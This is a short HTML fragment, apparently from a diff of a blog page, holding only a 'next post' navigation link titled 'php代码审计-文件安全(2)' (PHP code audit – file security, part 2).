+                        <span class="hidden-mobile">php代码审计-文件安全(2)</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
